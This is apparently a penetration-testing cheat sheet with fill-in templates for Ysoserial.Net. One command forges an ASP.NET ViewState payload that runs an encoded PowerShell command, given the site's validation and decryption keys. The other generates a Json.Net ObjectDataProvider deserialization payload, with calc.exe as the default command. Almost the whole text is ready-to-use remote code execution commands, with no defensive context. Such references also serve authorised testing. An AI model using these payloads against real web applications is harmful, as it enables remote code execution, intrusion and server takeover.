# Ysoserial.Net

## viewstate

### ViewState payload

Generate ViewState payload with Ysoserial.Net.

```cmd title:"Ysoserial.Net Generate ViewState Payload"
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -EncodedCommand $base64_encoded_command" --path="$asp_file_webroot_relative_path" --apppath="$application_path_webroot_relative" --decryptionalg="3DES" --decryptionkey="$decryption_key" --validationalg="SHA1" --validationkey="$validation_key"
```
<!-- cheat
var base64_encoded_command
var asp_file_webroot_relative_path
var application_path_webroot_relative
var decryption_key
var validation_key
-->

## json.net

### ObjectDataProvider

Generate ObjectDataProvider with Ysoserial.Net.

```cmd title:"Ysoserial.Net Generate ObjectDataProvider"
ysoserial.exe -f "$formatter" -g "$gadget" -o raw -c "$command" -t
```
<!-- cheat
var formatter := Json.Net
var gadget := ObjectDataProvider
var command := calc.exe
-->
